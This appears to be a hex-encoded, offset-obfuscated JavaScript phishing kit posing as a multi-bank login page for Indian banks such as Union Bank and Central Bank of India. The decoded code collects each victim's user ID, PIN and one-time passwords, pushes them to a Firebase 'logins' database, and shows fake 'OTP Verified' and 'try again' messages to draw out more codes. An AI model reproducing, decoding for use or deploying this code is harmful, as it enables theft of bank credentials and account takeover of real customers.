3d-3d-40-45-3b-77-7d-74-2f-2d-8a-39-17-2d-2d-88-2d-7b-6e-7a-72-47-2d-2f-56-7b-71-76-6e-7b-2d-4f-6e-7b-78-2f-39-2d-79-7c-74-7c-47-2d-2f-75-81-81-7d-80-47-3c-3c-76-3b-7d-7c-80-81-76-7a-74-3b-70-70-3c-81-61-43-55-61-86-74-5b-3c-56-5a-54-3a-3f-3d-3f-43-3d-46-3e-3d-3a-64-4e-3d-3d-40-46-3b-77-7d-74-2f-2d-8a-39-17-2d-2d-88-2d-7b-6e-7a-72-47-2d-2f-50-72-7b-81-7f-6e-79-2d-4f-6e-7b-78-2d-7c-73-2d-56-7b-71-76-6e-2f-39-2d-79-7c-74-7c-47-2d-2f-75-81-81-7d-80-47-3c-3c-76-3b-7d-7c-80-81-76-7a-74-3b-70-70-3c-71-81-7e-87-5a-54-54-7d-3c-56-5a-54-3a-3f-3d-3f-43-3d-46-3e-3d-3a-64-4e-3d-3d-41-3d-3b-77-7d-74-2f-2d-8a-17-6a-48-17-17-83-6e-7f-2d-80-72-79-72-70-81-72-71-4f-6e-7b-78-2d-4a-2d-7b-82-79-79-48-17-83-6e-7f-2d-70-82-7f-7f-72-7b-81-4e-81-81-72-7a-7d-81-2d-4a-2d-3e-48-17-83-6e-7f-2d-7d-72-7b-71-76-7b-74-59-7c-74-76-7b-51-6e-81-6e-2d-4a-2d-7b-82-79-79-48-17-17-73-82-7b-70-81-76-7c-7b-2d-7f-72-7b-71-72-7f-4f-6e-7b-78-54-7f-76-71-35-36-2d-88-17-2d-2d-83-6e-7f-2d-74-7f-76-71-2d-4a-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-6f-6e-7b-78-54-7f-76-71-56-7b-7b-72-7f-34-36-48-17-2d-2d-83-6e-7f-2d-75-81-7a-79-2d-4a-2d-34-34-48-17-2d-2d-73-7c-7f-2d-35-83-6e-7f-2d-76-2d-4a-2d-3d-48-2d-76-2d-49-2d-6f-6e-7b-78-80-3b-79-72-7b-74-81-75-48-2d-76-38-38-36-2d-88-17-2d-2d-2d-2d-83-6e-7f-2d-6f-2d-4a-2d-6f-6e-7b-78-80-68-76-6a-48-17-2d-2d-2d-2d-75-81-7a-79-2d-38-4a-2d-34-49-71-76-83-2d-70-79-6e-80-80-4a-2f-6f-6e-7b-78-3a-76-81-72-7a-2f-2d-71-6e-81-6e-3a-6f-6e-7b-78-4a-2f-34-2d-38-2d-6f-3b-7b-6e-7a-72-2d-38-2d-34-2f-2d-71-6e-81-6e-3a-79-7c-74-7c-4a-2f-34-2d-38-2d-6f-3b-79-7c-74-7c-2d-38-2d-34-2f-4b-34-48-17-2d-2d-2d-2d-75-81-7a-79-2d-38-4a-2d-34-49-71-76-83-2d-70-79-6e-80-80-4a-2f-6f-6e-7b-78-3a-76-81-72-7a-3a-79-7c-74-7c-2f-4b-49-76-7a-74-2d-80-7f-70-4a-2f-34-2d-38-2d-6f-3b-79-7c-74-7c-2d-38-2d-34-2f-2d-6e-79-81-4a-2f-34-2d-38-2d-6f-3b-7b-6e-7a-72-2d-38-2d-34-2f-4b-49-3c-71-76-83-4b-34-48-17-2d-2d-2d-2d-75-81-7a-79-2d-38-4a-2d-34-49-71-76-83-2d-70-79-6e-80-80-4a-2f-6f-6e-7b-78-3a-76-81-72-7a-3a-7b-6e-7a-72-2f-4b-34-2d-38-2d-6f-3b-7b-6e-7a-72-2d-38-2d-34-49-3c-71-76-83-4b-34-48-17-2d-2d-2d-2d-75-81-7a-79-2d-38-4a-2d-34-49-3c-71-76-83-4b-34-48-17-2d-2d-8a-17-2d-2d-74-7f-76-71-3b-76-7b-7b-72-7f-55-61-5a-59-2d-4a-2d-75-81-7a-79-48-17-17-2d-2d-74-7f-76-71-3b-6e-71-71-52-83-72-7b-81-59-76-80-81-72-7b-72-7f-35-34-70-79-76-70-78-34-39-2d-73-82-7b-70-81-76-7c-7b-35-72-36-2d-88-17-2d-2d-2d-2d-83-6e-7f-2d-76-81-72-7a-2d-4a-2d-72-3b-81-6e-7f-74-72-81-3b-70-79-7c-80-72-80-81-35-34-3b-6f-6e-7b-78-3a-76-81-72-7a-34-36-48-17-2d-2d-2d-2d-76-73-2d-35-2e-76-81-72-7a-36-2d-7f-72-81-82-7f-7b-48-17-2d-2d-2d-2d-83-6e-7f-2d-6f-6e-7b-78-5b-6e-7a-72-2d-4a-2d-76-81-72-7a-3b-74-72-81-4e-81-81-7f-76-6f-82-81-72-35-34-71-6e-81-6e-3a-6f-6e-7b-78-34-36-48-17-2d-2d-2d-2d-83-6e-7f-2d-6f-6e-7b-78-59-7c-74-7c-2d-4a-2d-76-81-72-7a-3b-74-72-81-4e-81-81-7f-76-6f-82-81-72-35-34-71-6e-81-6e-3a-79-7c-74-7c-34-36-48-17-2d-2d-2d-2d-80-72-79-72-70-81-4f-6e-7b-78-35-6f-6e-7b-78-5b-6e-7a-72-39-2d-6f-6e-7b-78-59-7c-74-7c-36-48-17-2d-2d-8a-36-48-17-8a-17-17-73-82-7b-70-81-76-7c-7b-2d-80-72-79-72-70-81-4f-6e-7b-78-35-6f-6e-7b-78-5b-6e-7a-72-39-2d-6f-6e-7b-78-59-7c-74-7c-36-2d-88-17-2d-2d-80-72-79-72-70-81-72-71-4f-6e-7b-78-2d-4a-2d-6f-6e-7b-78-5b-6e-7a-72-48-17-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-75-72-6e-71-72-7f-4f-6e-7b-78-5b-6e-7a-72-34-36-3b-81-72-85-81-50-7c-7b-81-72-7b-81-2d-4a-2d-6f-6e-7b-78-5b-6e-7a-72-48-17-2d-2d-71-7c-70-82-7a-72-7b-81-3b-81-76-81-79-72-2d-4a-2d-6f-6e-7b-78-5b-6e-7a-72-2d-38-2d-34-2d-3a-2d-59-7c-74-76-7b-34-48-17-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-6f-6e-7b-78-60-72-79-72-70-81-60-72-70-81-76-7c-7b-34-36-3b-80-81-86-79-72-3b-71-76-80-7d-79-6e-86-2d-4a-2d-34-7b-7c-7b-72-34-48-17-2d-2d-17-2d-2d-83-6e-7f-2d-6f-6e-7b-7b-72-7f-2d-4a-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-80-72-79-72-70-81-72-71-4f-6e-7b-78-4f-6e-7b-7b-72-7f-34-36-48-17-2d-2d-6f-6e-7b-7b-72-7f-3b-70-79-6e-80-80-59-76-80-81-3b-6e-71-71-35-34-80-75-7c-84-34-36-48-17-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-80-72-79-4f-6e-7b-78-5b-6e-7a-72-34-36-3b-81-72-85-81-50-7c-7b-81-72-7b-81-2d-4a-2d-6f-6e-7b-78-5b-6e-7a-72-48-17-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-80-72-79-59-7c-74-7c-34-36-3b-76-7b-7b-72-7f-55-61-5a-59-2d-4a-2d-34-49-76-7a-74-2d-80-7f-70-4a-2f-34-2d-38-2d-6f-6e-7b-78-59-7c-74-7c-2d-38-2d-34-2f-2d-6e-79-81-4a-2f-34-2d-38-2d-6f-6e-7b-78-5b-6e-7a-72-2d-38-2d-34-2f-4b-34-48-17-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-79-7c-74-76-7b-53-76-72-79-71-80-34-36-3b-70-79-6e-80-80-59-76-80-81-3b-6e-71-71-35-34-80-75-7c-84-34-36-48-17-17-2d-2d-80-72-81-61-76-7a-72-7c-82-81-35-73-82-7b-70-81-76-7c-7b-35-36-2d-88-17-2d-2d-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-79-7c-74-76-7b-62-80-72-7f-56-71-34-36-3b-73-7c-70-82-80-35-36-48-17-2d-2d-8a-39-2d-40-3d-3d-36-48-17-8a-17-17-73-82-7b-70-81-76-7c-7b-2d-70-75-6e-7b-74-72-4f-6e-7b-78-35-36-2d-88-17-2d-2d-80-72-79-72-70-81-72-71-4f-6e-7b-78-2d-4a-2d-7b-82-79-79-48-17-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-6f-6e-7b-78-60-72-79-72-70-81-60-72-70-81-76-7c-7b-34-36-3b-80-81-86-79-72-3b-71-76-80-7d-79-6e-86-2d-4a-2d-34-6f-79-7c-70-78-34-48-17-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-80-72-79-72-70-81-72-71-4f-6e-7b-78-4f-6e-7b-7b-72-7f-34-36-3b-70-79-6e-80-80-59-76-80-81-3b-7f-72-7a-7c-83-72-35-34-80-75-7c-84-34-36-48-17-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-79-7c-74-76-7b-53-76-72-79-71-80-34-36-3b-70-79-6e-80-80-59-76-80-81-3b-7f-72-7a-7c-83-72-35-34-80-75-7c-84-34-36-48-17-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-79-7c-74-76-7b-62-80-72-7f-56-71-34-36-3b-83-6e-79-82-72-2d-4a-2d-34-34-48-17-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-79-7c-74-76-7b-5d-76-7b-34-36-3b-83-6e-79-82-72-2d-4a-2d-34-34-48-17-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-75-72-6e-71-72-7f-4f-6e-7b-78-5b-6e-7a-72-34-36-3b-81-72-85-81-50-7c-7b-81-72-7b-81-2d-4a-2d-34-4e-79-79-2d-56-7b-71-76-6e-7b-2d-4f-6e-7b-78-80-34-48-17-2d-2d-71-7c-70-82-7a-72-7b-81-3b-81-76-81-79-72-2d-4a-2d-34-60-72-70-82-7f-72-2d-59-7c-74-76-7b-34-48-17-8a-17-17-73-82-7b-70-81-76-7c-7b-2d-73-7c-7f-74-7c-81-5d-76-7b-35-36-2d-88-17-2d-2d-6e-79-72-7f-81-35-34-5d-79-72-6e-80-72-2d-70-7c-7b-81-6e-70-81-2d-86-7c-82-7f-2d-6f-6e-7b-78-2d-6f-7f-6e-7b-70-75-2d-73-7c-7f-2d-5d-6e-80-80-84-7c-7f-71-2d-7f-72-80-72-81-3b-34-36-48-17-8a-17-17-73-82-7b-70-81-76-7c-7b-2d-7a-7c-83-72-5c-81-7d-35-70-82-7f-7f-72-7b-81-39-2d-7b-72-85-81-56-71-36-2d-88-17-2d-2d-76-73-2d-35-70-82-7f-7f-72-7b-81-3b-83-6e-79-82-72-3b-79-72-7b-74-81-75-2d-4a-4a-4a-2d-3e-36-2d-88-17-2d-2d-2d-2d-83-6e-7f-2d-7b-72-85-81-2d-4a-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-7b-72-85-81-56-71-36-48-17-2d-2d-2d-2d-76-73-2d-35-7b-72-85-81-36-2d-7b-72-85-81-3b-73-7c-70-82-80-35-36-48-17-2d-2d-8a-17-8a-17-17-73-82-7b-70-81-76-7c-7b-2d-75-6e-7b-71-79-72-59-7c-74-76-7b-35-36-2d-88-17-2d-2d-76-73-2d-35-2e-80-72-79-72-70-81-72-71-4f-6e-7b-78-36-2d-88-17-2d-2d-2d-2d-80-75-7c-84-4e-79-72-7f-81-35-34-79-7c-74-76-7b-60-82-70-70-72-80-80-34-39-2d-34-5d-79-72-6e-80-72-2d-80-72-79-72-70-81-2d-86-7c-82-7f-2d-6f-6e-7b-78-2d-73-76-7f-80-81-3b-34-39-2d-34-84-6e-7f-7b-76-7b-74-34-36-48-17-2d-2d-2d-2d-7f-72-81-82-7f-7b-48-17-2d-2d-8a-17-17-2d-2d-83-6e-7f-2d-82-80-72-7f-56-71-2d-4a-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-79-7c-74-76-7b-62-80-72-7f-56-71-34-36-3b-83-6e-79-82-72-3b-81-7f-76-7a-35-36-48-17-2d-2d-83-6e-7f-2d-7d-76-7b-2d-4a-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-79-7c-74-76-7b-5d-76-7b-34-36-3b-83-6e-79-82-72-3b-81-7f-76-7a-35-36-48-17-17-2d-2d-76-73-2d-35-2e-82-80-72-7f-56-71-2d-89-89-2d-2e-7d-76-7b-36-2d-88-2d-17-2d-2d-2d-2d-80-75-7c-84-4e-79-72-7f-81-35-34-79-7c-74-76-7b-60-82-70-70-72-80-80-34-39-2d-34-5d-79-72-6e-80-72-2d-72-7b-81-72-7f-2d-6f-7c-81-75-2d-62-80-72-7f-7b-6e-7a-72-2d-6e-7b-71-2d-5d-6e-80-80-84-7c-7f-71-3b-34-39-2d-34-84-6e-7f-7b-76-7b-74-34-36-48-2d-17-2d-2d-2d-2d-7f-72-81-82-7f-7b-48-2d-17-2d-2d-8a-17-2d-2d-76-73-2d-35-7d-76-7b-3b-79-72-7b-74-81-75-2d-49-2d-41-2d-89-89-2d-7d-76-7b-3b-79-72-7b-74-81-75-2d-4b-2d-43-36-2d-88-2d-17-2d-2d-2d-2d-80-75-7c-84-4e-79-72-7f-81-35-34-79-7c-74-76-7b-60-82-70-70-72-80-80-34-39-2d-34-7d-6e-80-80-84-7c-7f-71-2d-7a-82-80-81-2d-6f-72-2d-41-3a-43-2d-71-76-74-76-81-80-3b-34-39-2d-34-84-6e-7f-7b-76-7b-74-34-36-48-2d-17-2d-2d-2d-2d-7f-72-81-82-7f-7b-48-2d-17-2d-2d-8a-17-17-2d-2d-7d-72-7b-71-76-7b-74-59-7c-74-76-7b-51-6e-81-6e-2d-4a-2d-88-2d-6f-6e-7b-78-47-2d-80-72-79-72-70-81-72-71-4f-6e-7b-78-39-2d-82-80-72-7f-56-71-47-2d-82-80-72-7f-56-71-39-2d-7d-76-7b-47-2d-7d-76-7b-2d-8a-48-17-17-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-79-7c-74-76-7b-53-7c-7f-7a-60-72-70-81-76-7c-7b-34-36-3b-80-81-86-79-72-3b-71-76-80-7d-79-6e-86-2d-4a-2d-34-7b-7c-7b-72-34-48-17-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-7c-81-7d-60-72-70-81-76-7c-7b-34-36-3b-70-79-6e-80-80-59-76-80-81-3b-6e-71-71-35-34-80-75-7c-84-34-36-48-17-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-7c-81-7d-4f-6e-7b-78-61-6e-74-34-36-3b-81-72-85-81-50-7c-7b-81-72-7b-81-2d-4a-2d-80-72-79-72-70-81-72-71-4f-6e-7b-78-48-17-17-2d-2d-70-82-7f-7f-72-7b-81-4e-81-81-72-7a-7d-81-2d-4a-2d-3e-48-17-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-6e-81-81-72-7a-7d-81-50-7c-82-7b-81-34-36-3b-81-72-85-81-50-7c-7b-81-72-7b-81-2d-4a-2d-70-82-7f-7f-72-7b-81-4e-81-81-72-7a-7d-81-48-17-2d-2d-82-7d-71-6e-81-72-4e-81-81-72-7a-7d-81-51-7c-81-80-35-36-48-17-2d-2d-75-76-71-72-4e-79-72-7f-81-35-34-7c-81-7d-5a-72-80-80-6e-74-72-34-36-48-17-17-2d-2d-73-7c-7f-2d-35-83-6e-7f-2d-76-2d-4a-2d-3e-48-2d-76-2d-49-4a-2d-43-48-2d-76-38-38-36-2d-88-17-2d-2d-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-7c-81-7d-34-2d-38-2d-76-36-3b-83-6e-79-82-72-2d-4a-2d-34-34-48-17-2d-2d-8a-17-2d-2d-80-72-81-61-76-7a-72-7c-82-81-35-73-82-7b-70-81-76-7c-7b-35-36-2d-88-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-7c-81-7d-3e-34-36-3b-73-7c-70-82-80-35-36-48-2d-8a-39-2d-40-3d-3d-36-48-17-8a-17-17-73-82-7b-70-81-76-7c-7b-2d-82-7d-71-6e-81-72-4e-81-81-72-7a-7d-81-51-7c-81-80-35-36-2d-88-17-2d-2d-83-6e-7f-2d-71-3e-2d-4a-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-71-7c-81-3e-34-36-48-17-2d-2d-83-6e-7f-2d-71-3f-2d-4a-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-71-7c-81-3f-34-36-48-17-2d-2d-83-6e-7f-2d-71-40-2d-4a-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-71-7c-81-40-34-36-48-17-2d-2d-71-3e-3b-70-79-6e-80-80-5b-6e-7a-72-2d-4a-2d-34-71-7c-81-34-48-2d-71-3f-3b-70-79-6e-80-80-5b-6e-7a-72-2d-4a-2d-34-71-7c-81-34-48-2d-71-40-3b-70-79-6e-80-80-5b-6e-7a-72-2d-4a-2d-34-71-7c-81-34-48-17-2d-2d-76-73-2d-35-70-82-7f-7f-72-7b-81-4e-81-81-72-7a-7d-81-2d-4a-4a-4a-2d-3e-36-2d-71-3e-3b-70-79-6e-80-80-59-76-80-81-3b-6e-71-71-35-34-6e-70-81-76-83-72-34-36-48-17-2d-2d-72-79-80-72-2d-76-73-2d-35-70-82-7f-7f-72-7b-81-4e-81-81-72-7a-7d-81-2d-4a-4a-4a-2d-3f-36-2d-88-2d-71-3e-3b-70-79-6e-80-80-59-76-80-81-3b-6e-71-71-35-34-82-80-72-71-34-36-48-2d-71-3f-3b-70-79-6e-80-80-59-76-80-81-3b-6e-71-71-35-34-6e-70-81-76-83-72-34-36-48-2d-8a-17-2d-2d-72-79-80-72-2d-76-73-2d-35-70-82-7f-7f-72-7b-81-4e-81-81-72-7a-7d-81-2d-4a-4a-4a-2d-40-36-2d-88-2d-71-3e-3b-70-79-6e-80-80-59-76-80-81-3b-6e-71-71-35-34-82-80-72-71-34-36-48-2d-71-3f-3b-70-79-6e-80-80-59-76-80-81-3b-6e-71-71-35-34-82-80-72-71-34-36-48-2d-71-40-3b-70-79-6e-80-80-59-76-80-81-3b-6e-71-71-35-34-6e-70-81-76-83-72-34-36-48-2d-8a-17-8a-17-17-73-82-7b-70-81-76-7c-7b-2d-83-72-7f-76-73-86-5c-81-7d-35-36-2d-88-17-2d-2d-83-6e-7f-2d-7c-81-7d-2d-4a-2d-34-34-48-17-2d-2d-73-7c-7f-2d-35-83-6e-7f-2d-76-2d-4a-2d-3e-48-2d-76-2d-49-4a-2d-43-48-2d-76-38-38-36-2d-88-17-2d-2d-2d-2d-7c-81-7d-2d-38-4a-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-7c-81-7d-34-2d-38-2d-76-36-3b-83-6e-79-82-72-48-17-2d-2d-8a-17-17-2d-2d-76-73-2d-35-7c-81-7d-3b-79-72-7b-74-81-75-2d-2e-4a-4a-2d-43-36-2d-88-17-2d-2d-2d-2d-80-75-7c-84-4e-79-72-7f-81-35-34-7c-81-7d-5a-72-80-80-6e-74-72-34-39-2d-34-5d-79-72-6e-80-72-2d-72-7b-81-72-7f-2d-6e-79-79-2d-43-2d-71-76-74-76-81-80-3b-34-39-2d-34-84-6e-7f-7b-76-7b-74-34-36-48-17-2d-2d-2d-2d-7f-72-81-82-7f-7b-48-17-2d-2d-8a-17-17-2d-2d-76-73-2d-35-70-82-7f-7f-72-7b-81-4e-81-81-72-7a-7d-81-2d-49-2d-40-36-2d-88-17-2d-2d-2d-2d-80-75-7c-84-4e-79-72-7f-81-35-34-7c-81-7d-5a-72-80-80-6e-74-72-34-39-2d-34-2759-2d-56-7b-83-6e-79-76-71-2d-5c-61-5d-3b-2d-61-7f-86-2d-6e-74-6e-76-7b-3b-2d-35-4e-81-81-72-7a-7d-81-2d-34-2d-38-2d-70-82-7f-7f-72-7b-81-4e-81-81-72-7a-7d-81-2d-38-2d-34-3c-40-36-34-39-2d-34-72-7f-7f-7c-7f-34-36-48-17-2d-2d-2d-2d-70-82-7f-7f-72-7b-81-4e-81-81-72-7a-7d-81-38-38-48-17-2d-2d-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-6e-81-81-72-7a-7d-81-50-7c-82-7b-81-34-36-3b-81-72-85-81-50-7c-7b-81-72-7b-81-2d-4a-2d-70-82-7f-7f-72-7b-81-4e-81-81-72-7a-7d-81-48-17-2d-2d-2d-2d-82-7d-71-6e-81-72-4e-81-81-72-7a-7d-81-51-7c-81-80-35-36-48-17-17-2d-2d-2d-2d-73-7c-7f-2d-35-83-6e-7f-2d-76-2d-4a-2d-3e-48-2d-76-2d-49-4a-2d-43-48-2d-76-38-38-36-2d-88-17-2d-2d-2d-2d-2d-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-7c-81-7d-34-2d-38-2d-76-36-3b-83-6e-79-82-72-2d-4a-2d-34-34-48-17-2d-2d-2d-2d-8a-17-2d-2d-2d-2d-80-72-81-61-76-7a-72-7c-82-81-35-73-82-7b-70-81-76-7c-7b-35-36-2d-88-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-34-7c-81-7d-3e-34-36-3b-73-7c-70-82-80-35-36-48-2d-8a-39-2d-3f-3d-3d-36-48-17-17-2d-2d-2d-2d-76-73-2d-35-70-82-7f-7f-72-7b-81-4e-81-81-72-7a-7d-81-2d-4a-4a-4a-2d-40-36-2d-88-17-2d-2d-2d-2d-2d-2d-80-72-81-61-76-7a-72-7c-82-81-35-73-82-7b-70-81-76-7c-7b-35-36-2d-88-17-2d-2d-2d-2d-2d-2d-2d-2d-80-75-7c-84-4e-79-72-7f-81-35-34-7c-81-7d-5a-72-80-80-6e-74-72-34-39-2d-34-26ad-fe1c-2d-53-76-7b-6e-79-2d-6e-81-81-72-7a-7d-81-3b-2d-5d-79-72-6e-80-72-2d-72-7b-81-72-7f-2d-5c-61-5d-2d-70-6e-7f-72-73-82-79-79-86-3b-34-39-2d-34-84-6e-7f-7b-76-7b-74-34-36-48-17-2d-2d-2d-2d-2d-2d-8a-39-2d-3e-45-3d-3d-36-48-17-2d-2d-2d-2d-8a-17-2d-2d-8a-2d-72-79-80-72-2d-88-17-2d-2d-2d-2d-6e-70-70-72-7d-81-59-7c-74-76-7b-35-36-48-17-2d-2d-8a-17-8a-17-17-73-82-7b-70-81-76-7c-7b-2d-6e-70-70-72-7d-81-59-7c-74-76-7b-35-36-2d-88-17-2d-2d-80-75-7c-84-4e-79-72-7f-81-35-34-7c-81-7d-5a-72-80-80-6e-74-72-34-39-2d-34-2712-2d-5c-61-5d-2d-63-72-7f-76-73-76-72-71-2e-2d-59-7c-74-74-76-7b-74-2d-76-7b-3b-3b-3b-34-39-2d-34-80-82-70-70-72-80-80-34-36-48-17-17-2d-2d-83-6e-7f-2d-7b-7c-84-2d-4a-2d-7b-72-84-2d-51-6e-81-72-35-36-48-17-2d-2d-83-6e-7f-2d-81-76-7a-72-60-81-7f-2d-4a-2d-7b-7c-84-3b-81-7c-59-7c-70-6e-79-72-60-81-7f-76-7b-74-35-34-72-7b-3a-62-60-34-39-2d-88-2d-75-7c-82-7f-3e-3f-47-2d-81-7f-82-72-2d-8a-36-48-17-17-2d-2d-83-6e-7f-2d-79-7c-74-76-7b-51-6e-81-6e-2d-4a-2d-88-17-2d-2d-2d-2d-6f-6e-7b-78-47-2d-7d-72-7b-71-76-7b-74-59-7c-74-76-7b-51-6e-81-6e-3b-6f-6e-7b-78-39-17-2d-2d-2d-2d-82-80-72-7f-56-71-47-2d-7d-72-7b-71-76-7b-74-59-7c-74-76-7b-51-6e-81-6e-3b-82-80-72-7f-56-71-39-17-2d-2d-2d-2d-7d-76-7b-47-2d-7d-72-7b-71-76-7b-74-59-7c-74-76-7b-51-6e-81-6e-3b-7d-76-7b-39-17-2d-2d-2d-2d-80-81-6e-81-82-80-47-2d-34-80-82-70-70-72-80-80-34-39-17-2d-2d-2d-2d-81-76-7a-72-47-2d-81-76-7a-72-60-81-7f-39-17-2d-2d-2d-2d-81-76-7a-72-80-81-6e-7a-7d-47-2d-7b-7c-84-3b-74-72-81-61-76-7a-72-35-36-39-17-2d-2d-2d-2d-71-72-83-76-70-72-47-2d-7b-6e-83-76-74-6e-81-7c-7f-3b-82-80-72-7f-4e-74-72-7b-81-2d-89-89-2d-34-62-7b-78-7b-7c-84-7b-34-39-17-2d-2d-2d-2d-76-7d-47-2d-34-3e-46-3f-3b-3e-43-45-3b-3e-3b-34-2d-38-2d-5a-6e-81-75-3b-73-79-7c-7c-7f-35-5a-6e-81-75-3b-7f-6e-7b-71-7c-7a-35-36-2d-37-2d-3f-42-42-36-39-17-2d-2d-2d-2d-7c-81-7d-4e-81-81-72-7a-7d-81-80-47-2d-40-17-2d-2d-8a-48-17-17-2d-2d-71-6e-81-6e-6f-6e-80-72-3b-7f-72-73-35-34-79-7c-74-76-7b-80-34-36-3b-7d-82-80-75-35-79-7c-74-76-7b-51-6e-81-6e-36-17-2d-2d-2d-2d-3b-81-75-72-7b-35-73-82-7b-70-81-76-7c-7b-35-36-2d-88-17-2d-2d-2d-2d-2d-2d-70-7c-7b-80-7c-79-72-3b-79-7c-74-35-34-60-6e-83-72-71-47-34-39-2d-79-7c-74-76-7b-51-6e-81-6e-36-48-17-2d-2d-2d-2d-2d-2d-80-72-81-61-76-7a-72-7c-82-81-35-73-82-7b-70-81-76-7c-7b-35-36-2d-88-17-2d-2d-2d-2d-2d-2d-2d-2d-83-6e-7f-2d-80-6e-83-72-71-62-80-72-7f-56-71-2d-4a-2d-7d-72-7b-71-76-7b-74-59-7c-74-76-7b-51-6e-81-6e-3b-82-80-72-7f-56-71-48-17-2d-2d-2d-2d-2d-2d-2d-2d-73-82-79-79-5f-72-80-72-81-35-36-48-17-2d-2d-2d-2d-2d-2d-2d-2d-80-75-7c-84-4e-79-72-7f-81-35-34-79-7c-74-76-7b-60-82-70-70-72-80-80-34-39-2d-34-2712-2d-59-7c-74-76-7b-2d-80-82-70-70-72-80-80-73-82-79-2e-2d-64-72-79-70-7c-7a-72-2d-34-2d-38-2d-80-6e-83-72-71-62-80-72-7f-56-71-39-2d-34-80-82-70-70-72-80-80-34-36-48-17-2d-2d-2d-2d-2d-2d-2d-2d-80-72-81-61-76-7a-72-7c-82-81-35-73-82-7b-70-81-76-7c-7b-35-36-2d-88-2d-75-76-71-72-4e-79-72-7f-81-35-34-79-7c-74-76-7b-60-82-70-70-72-80-80-34-36-48-2d-8a-39-2d-42-3d-3d-3d-36-48-17-2d-2d-2d-2d-2d-2d-8a-39-2d-3e-42-3d-3d-36-48-17-2d-2d-2d-2d-8a-36-17-2d-2d-2d-2d-3b-70-6e-81-70-75-35-73-82-7b-70-81-76-7c-7b-35-72-7f-7f-7c-7f-36-2d-88-17-2d-2d-2d-2d-2d-2d-70-7c-7b-80-7c-79-72-3b-72-7f-7f-7c-7f-35-34-53-76-7f-72-6f-6e-80-72-2d-72-7f-7f-7c-7f-47-34-39-2d-72-7f-7f-7c-7f-36-48-17-2d-2d-2d-2d-2d-2d-80-75-7c-84-4e-79-72-7f-81-35-34-7c-81-7d-5a-72-80-80-6e-74-72-34-39-2d-34-2759-2d-52-7f-7f-7c-7f-2d-80-6e-83-76-7b-74-3b-2d-5d-79-72-6e-80-72-2d-81-7f-86-2d-6e-74-6e-76-7b-3b-34-39-2d-34-72-7f-7f-7c-7f-34-36-48-17-2d-2d-2d-2d-8a-36-48-17-8a-17-17-73-82-7b-70-81-76-7c-7b-2d-80-75-7c-84-4e-79-72-7f-81-35-76-71-39-2d-81-72-85-81-39-2d-81-86-7d-72-36-2d-88-17-2d-2d-83-6e-7f-2d-72-79-2d-4a-2d-71-7c-70-82-7a-72-7b-81-3b-74-72-81-52-79-72-7a-72-7b-81-4f-86-56-71-35-76-71-36-48-17-2d-2d-72-79-3b-81-72-85-81-50-7c-7b-81-72-7b-81-2d-4a-2d-81-72-85-81-48-17-2d-2d-72-79-3b-70-79-6e-80-80-5b-6e-7a-72-2d-4a-2d-34-6e-79-72-7f-81-2d-80-75-7c-84-2d-6e-79-72-7f-81-3a-34-2d-38-2d-35-81-86-7d-72-2d-89-89-2d-34-80-82-70-70-72-80-80-34-36-48-17-8a-17-73-82-7b-70-81-76-7c-7b-2d-75-76-71-72-4e-79-72-7f-81-35-76-71-36-2d-88-17-2d-2d-